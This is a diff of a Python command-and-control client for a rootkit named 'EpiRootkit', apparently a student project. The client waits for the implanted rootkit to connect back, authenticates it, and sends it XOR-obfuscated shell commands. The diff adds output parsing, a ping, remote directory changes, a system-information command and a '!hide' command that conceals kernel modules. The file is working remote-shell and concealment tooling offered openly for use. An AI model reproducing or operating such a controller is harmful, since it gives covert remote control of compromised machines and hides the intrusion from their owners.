@@ -2,6 +2,7 @@ import argparse
 import socket
 import logging
 import sys
+import os
 import time
 
 XOR_KEY = 0x2A
@@ -12,13 +13,20 @@ def xor_encrypt_decrypt(data: bytes) -> bytes:
     return bytes(b ^ XOR_KEY for b in data)
 
 
+def clear_screen():
+    os.system('clear')
+
+
 class EpiRootkitClient:
     def __init__(self, host: str, port: int, password: str, debug: bool = False):
         self.host = host
         self.port = port
         self.password = password
+        self.current_directory = "/"
         log_level = logging.DEBUG if debug else logging.INFO
-        logging.basicConfig(level=log_level, format='[%(levelname)s] %(message)s')
+        logging.basicConfig(level=log_level,
+                            format='[%(levelname)s %(asctime)s] %(message)s',
+                            datefmt='%Y-%m-%d %H:%M:%S')
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
@@ -47,7 +55,14 @@ class EpiRootkitClient:
                     continue
 
                 logging.info("[+] Authentication successful")
-                self._handle_session(conn)
+
+                try:
+                    self._handle_session(conn)
+                except Exception as e:
+                    logging.error(f"Session error: {e}")
+                finally:
+                    conn.close()
+                    logging.info("[*] Connection closed. Waiting for reconnection...")
         except KeyboardInterrupt:
             logging.info("Server shutting down.")
         finally:
@@ -77,7 +92,7 @@ class EpiRootkitClient:
     def _handle_session(self, conn: socket.socket):
         while True:
             try:
-                cmd = input("epirootkit> ")
+                cmd = input("epirootkit> ").strip()
             except EOFError:
                 logging.info("Input stream closed. Ending session.")
                 break
@@ -85,46 +100,100 @@ class EpiRootkitClient:
             if not cmd:
                 continue
 
-            if cmd in ("exit", "quit"):
-                encrypted_cmd = xor_encrypt_decrypt(cmd.encode('utf-8'))
-                conn.sendall(encrypted_cmd)
-                logging.info("Sent exit command to rootkit. Closing session.")
-                break
+            if cmd.startswith("!"):
+                self._handle_internal_command(conn, cmd)
+                continue
 
             encrypted_cmd = xor_encrypt_decrypt(cmd.encode('utf-8'))
-            conn.sendall(encrypted_cmd)
-            logging.debug(f"Sent command: {cmd}")
+            try:
+                conn.sendall(encrypted_cmd)
+            except socket.error:
+                logging.warning("Connection lost while sending command.")
+                return
 
-            output_buffer = ""
-            start_time = time.strftime("%Y-%m-%d %H:%M:%S")
-            while True:
-                data = conn.recv(4096)
-                if not data:
-                    logging.warning("Connection lost while receiving command output.")
-                    return
+            buffer = ""
+            try:
+                while True:
+                    data = conn.recv(4096)
+                    if not data:
+                        logging.warning("Connection lost while receiving command output.")
+                        return
+                    chunk = xor_encrypt_decrypt(data).decode('utf-8', errors='ignore')
+                    buffer += chunk
+                    if EOF_MARKER in chunk:
+                        break
+            except socket.error:
+                logging.warning("Connection lost during response read.")
+                return
 
-                chunk = xor_encrypt_decrypt(data)
-                text_chunk = chunk.decode('utf-8', errors='ignore')
+            self._parse_and_display_response(cmd, buffer)
 
-                if EOF_MARKER in text_chunk:
-                    before_eof, _ = text_chunk.split(EOF_MARKER, 1)
-                    output_buffer += before_eof
-                    break
+    def _parse_and_display_response(self, cmd: str, full_output: str):
+        print(f"[INFO {time.strftime('%Y-%m-%d %H:%M:%S')}] Command: {cmd}")
+        stdout = stderr = status = ""
+
+        if "--STDERR--" in full_output:
+            stdout, rest = full_output.split("--STDERR--", 1)
+            if "--STATUS--" in rest:
+                stderr, rest = rest.split("--STATUS--", 1)
+                status, _ = rest.split(EOF_MARKER, 1)
+        else:
+            if "--STATUS--" in full_output:
+                stdout, rest = full_output.split("--STATUS--", 1)
+                status, _ = rest.split(EOF_MARKER, 1)
+
+        for line in stdout.strip().splitlines():
+            print(f"[OUTPUT] {line}")
+        for line in stderr.strip().splitlines():
+            print(f"[ERROR] {line}")
+
+        if status:
+            code = status.strip()
+            label = "Success" if code == "0" else "Failure"
+            print(f"[STATUS] Exit code: {code} ({label})")
+
+    def _handle_internal_command(self, conn: socket.socket, cmd: str):
+        if cmd == "!clear":
+            clear_screen()
+        elif cmd == "!ping":
+            try:
+                start = time.time()
+                conn.sendall(xor_encrypt_decrypt(b"PING"))
+                conn.settimeout(2.0)
+                data = conn.recv(1024)
+                conn.settimeout(None)
+                if data:
+                    resp = xor_encrypt_decrypt(data).decode().strip()
+                    latency = (time.time() - start) * 1000
+                    print(f"[INFO] Ping response: {resp} ({latency:.0f} ms)")
                 else:
-                    output_buffer += text_chunk
-
-            if output_buffer:
-                print(f"\n[{start_time}] Output:")
-                print(output_buffer.strip())
-            output_buffer = ""
+                    logging.warning("Empty ping response from rootkit.")
+            except socket.timeout:
+                logging.error("No ping response from rootkit.")
+            except socket.error:
+                logging.error("Connection error during ping.")
+        elif cmd.startswith("!cd "):
+            target = cmd[4:].strip()
+            full_cmd = f"cd {target}"
+            encrypted_cmd = xor_encrypt_decrypt(full_cmd.encode('utf-8'))
+            conn.sendall(encrypted_cmd)
+        elif cmd == "!sysinfo":
+            encrypted_cmd = xor_encrypt_decrypt(b"uname -a; uptime; whoami")
+            conn.sendall(encrypted_cmd)
+        elif cmd.startswith("!hide "):
+            mod = cmd[6:].strip()
+            encrypted_cmd = xor_encrypt_decrypt(f"hide {mod}".encode('utf-8'))
+            conn.sendall(encrypted_cmd)
+        else:
+            print("[INFO] Unknown internal command")
 
 
 def main():
-    parser = argparse.ArgumentParser(description="EpiRootkit Client")
-    parser.add_argument("--host", type=str, default="0.0.0.0", help="Listening IP")
-    parser.add_argument("--port", type=int, default=4242, help="Listening port")
-    parser.add_argument("--password", type=str, default="secret", help="Authentication password")
-    parser.add_argument("--debug", action="store_true", help="Enable debug output")
+    parser = argparse.ArgumentParser(description="EpiRootkit attacking client")
+    parser.add_argument("--host", required=True, help="Host to bind to")
+    parser.add_argument("--port", required=True, type=int, help="Port to bind to")
+    parser.add_argument("--password", default="secret", help="Password for authentication")
+    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
     args = parser.parse_args()
 
     client = EpiRootkitClient(args.host, args.port, args.password, args.debug)
